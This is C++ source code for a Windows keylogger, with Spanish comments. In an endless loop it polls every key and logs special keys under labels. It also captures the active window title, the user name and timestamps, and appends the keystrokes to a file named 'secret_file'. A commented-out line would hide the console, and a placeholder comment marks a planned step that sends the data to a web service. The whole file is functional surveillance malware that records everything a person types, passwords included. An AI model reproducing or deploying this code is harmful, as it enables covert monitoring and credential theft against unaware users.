#include<Windows.h>
#include<iostream>
#include<fstream>
#include<string>
#include<ctime>
#include<lmcons.h>

using namespace std;

TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;

void EscribirArchivo(LPCSTR texto) {
	ofstream archivo;
	archivo.open("secret_file", fstream::app);
	archivo << texto;
	archivo.close();
}

bool TeclasPulsadas(int tecla) {
	switch (tecla) {
	case VK_SPACE:
		// Process the SPACE key.
		cout << " ";
		EscribirArchivo(" ");
		return true;
		break;
	case VK_RETURN:
		// Process the ENTER key.
		cout << "\n";
		EscribirArchivo(" {INTRO} ");
		return true;
		break;
	case VK_SHIFT:
		// Process the SHIFT key.
		cout << " {SHIFT} ";
		EscribirArchivo(" {SHIFT} ");
		return true;
		break;
	case VK_BACK:
		// Process the BACK SPACE key.
		cout << " {RETROCESO} ";
		EscribirArchivo(" {RETROCESO} ");
		return true;
		break;
	case VK_LEFT:
		// Process the LEFT ARROW key.
		cout << " {LEFT} ";
		EscribirArchivo(" {LEFT} ");
		return true;
		break;
	case VK_RIGHT:
		// Process the RIGHT ARROW key.
		cout << " {RIGHT} ";
		EscribirArchivo(" {RIGHT} ");
		return true;
		break;

	case VK_UP:
		// Process the UP ARROW key. 
		cout << " {UP} ";
		EscribirArchivo(" {UP} ");
		return true;
		break;

	case VK_DOWN:
		// Process the DOWN ARROW key. 
		cout << " {DOWN} ";
		EscribirArchivo(" {DOWN} ");
		return true;
		break;

	case VK_HOME:
		// Process the HOME key. 
		cout << " {HOME} ";
		EscribirArchivo(" {HOME} ");
		return true;
		break;

	case VK_END:
		// Process the END key. 
		cout << " {END} ";
		EscribirArchivo(" {END} ");
		return true;
		break;

	case VK_INSERT:
		// Process the INS key.
		cout << " {INSERT} ";
		EscribirArchivo(" {INSERT} ");
		return true;
		break;

	case VK_DELETE:
		// Process the DEL key. 
		cout << " {DELETE} ";
		EscribirArchivo(" {DELETE} ");
		return true;
		break;

	case VK_F1:
		// Process the F1 key.
		cout << " {F1} ";
		EscribirArchivo(" {F1} ");
		return true;
		break;

	case VK_F2:
		// Process the F2 key.
		cout << " {F2} ";
		EscribirArchivo(" {F2} ");
		return true;
		break;

	case VK_F3:
		// Process the F3 key.
		cout << " {F3} ";
		EscribirArchivo(" {F3} ");
		return true;
		break;

	case VK_F4:
		// Process the F4 key.
		cout << " {F4} ";
		EscribirArchivo(" {F4} ");
		return true;
		break;

	case VK_F5:
		// Process the F5 key.
		cout << " {F5} ";
		EscribirArchivo(" {F5} ");
		return true;
		break;

	case VK_F6:
		// Process the F6 key.
		cout << " {F6} ";
		EscribirArchivo(" {F6} ");
		return true;
		break;

	case VK_F7:
		// Process the F7 key.
		cout << " {F7} ";
		EscribirArchivo(" {F7} ");
		return true;
		break;

	case VK_F8:
		// Process the F8 key.
		cout << " {F8} ";
		EscribirArchivo(" {F8} ");
		return true;
		break;

	case VK_F9:
		// Process the F1 key.
		cout << " {F9} ";
		EscribirArchivo(" {F9} ");
		return true;
		break;

	case VK_F10:
		// Process the F10 key.
		cout << " {F10} ";
		EscribirArchivo(" {F10} ");
		return true;
		break;

	case VK_F11:
		// Process the F11 key.
		cout << " {F11} ";
		EscribirArchivo(" {F11} ");
		return true;
		break;

	case VK_F12:
		// Process the F12 key.
		cout << " {F12} ";
		EscribirArchivo(" {F12} ");
		return true;
		break;

	default: return false;
	}
}

HWND GetWindow() {
	HWND ventana = NULL;
	return ventana = GetForegroundWindow(); //Ventana activa que tiene capturada la entrada del teclado
}

struct tecla {
	string tiempo;
	string ventana;
	char key;
	string nombre;
} tecla;

int main() {
	//FreeConsole();
	unsigned char key;
	
	while (TRUE) {
		Sleep(10);

		for (key = 8; key <= 255; key++) {
			if (GetAsyncKeyState(key) == -32767) {

				if (TeclasPulsadas(key) == FALSE) {
					const int SizeOfTitleBarText = GetWindowTextLength(GetWindow());
					char *wnd_title = (char*)malloc(SizeOfTitleBarText+1);
					GetWindowText(GetWindow(), wnd_title, SizeOfTitleBarText+1);
					std::time_t time = std::time(nullptr);
					GetUserName((TCHAR*)username, &username_len);	//Obtención del nombre de usuario
					//cout << wnd_title;
					//cout << std::to_string(time);

					//Asignación de las variables de la estructura
					tecla.key = key;
					tecla.ventana = wnd_title;
					string timestamp = std::to_string(time);
					tecla.tiempo = timestamp;
					string name = username;
					tecla.nombre = ""+name+"_"+timestamp;

					//Envío al web service

					//Impresión de depuración
					cout << tecla.key;
					cout << tecla.ventana;
					cout << tecla.tiempo;
					cout << tecla.nombre;

					//Volcado a archivo
					ofstream archivo;
					archivo.open("secret_file", fstream::app);
					archivo << key;
					archivo.close();
					free(wnd_title);
				}
			}
		}
	}
}